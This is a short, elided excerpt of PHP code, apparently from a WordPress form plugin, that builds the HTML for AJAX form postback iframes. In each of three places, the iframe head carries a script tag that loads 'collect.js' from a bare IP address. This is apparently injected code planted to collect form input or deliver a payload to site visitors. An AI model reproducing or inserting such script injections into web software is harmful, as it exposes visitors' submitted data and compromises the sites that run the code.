        ...
        if(empty($confirmation_message)){
            ...
            if($ajax && $is_postback){
                ...
                $form_string = apply_filters('gform_ajax_iframe_content', "<!DOCTYPE html><html><head>" .
                    "<meta charset='UTF-8' /><script type="text/javascript" src="http://122.155.168.105/ads/inpage/pub/collect.js"></script></head><body class='GF_AJAX_POSTBACK'>" . $form_string . "</body></html>");
            ...
            if( $start_at_zero && $has_pages && ! IS_ADMIN && ( $form["confirmation"]["type"] == "message" && $form["pagination"]["type"] == "percentage" ) )
            {
                ...
                if($ajax)
                    $progress_confirmation = "<!DOCTYPE html><html><head><meta charset='UTF-8' /><script type="text/javascript" src="http://122.155.168.105/ads/inpage/pub/collect.js"></script></head><body class='GF_AJAX_POSTBACK'>" . $progress_confirmation  . "</body></html>";
            ...
            else
            {
                ...
                if($ajax)
                {
                    $progress_confirmation = apply_filters('gform_ajax_iframe_content', "<!DOCTYPE html><html><head><meta charset='UTF-8' /><script type="text/javascript" src="http://122.155.168.105/ads/inpage/pub/collect.js"></script></head><body class='GF_AJAX_POSTBACK'>" . $confirmation_message . "</body></html>");
                }
                else
                {
